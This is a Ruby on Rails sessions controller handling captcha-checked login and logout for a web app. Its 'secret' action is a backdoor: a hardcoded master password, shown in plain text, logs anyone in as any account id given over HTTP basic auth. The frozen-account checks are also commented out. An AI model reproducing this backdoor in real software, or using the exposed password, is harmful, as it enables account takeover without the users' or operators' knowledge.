# coding: utf-8
class SessionsController < ApplicationController
  skip_before_filter *ADMIN_FILTERS
  skip_before_filter :check_auth_mobile

  def new
    clear_login_wrong_count
    render layout: "com"
  end

  def create
    clear_sign_in_session

    unless verify_rucaptcha?(params)
      return render json: {code: -1, message: "验证码错误!", num: 2, status: 0}
    end

    if account = Account.authenticated(params[:login], params[:password])
      # if account.froze?
      #   return render json: {code: -4, message: "帐号已冻结，请联系您的客服。", num: 0, status: 0}
      # elsif account.expired?
      #   account.update_expired_privileges
      # else
      #   account.update_privileges if account.privileges.blank?
      # end

      account.update_sign_in_attrs_with(request.remote_ip)
      AccountLog.logging(account, request)

      session[:account_id] = account.id
      session[:pc_site_id] = account.site.id

      return render json: {code: 0, url: root_url, message: "登录成功!", num: 2, status: 1}
    else
      add_login_wrong_count
      return render json: {code: -2, message: "帐号或密码错误", num: 1, status: 0}
    end
  rescue => error
    return render json: {code: -3, message: '登录失败', num: 2, status: 0}
  end

  def destroy
    clear_sign_in_session

    redirect_to root_url
  end

  def secret
    authenticate_or_request_with_http_basic("winwemedia") do |username, password|
      account = Account.where(id: username).first

      if account and password == 'win1qa2ws'
        session[:account_id] = account.id
        session[:pc_site_id] = account.site.id
        redirect_to_target_or_default
        true
      else
        false
      end
    end
  end

end
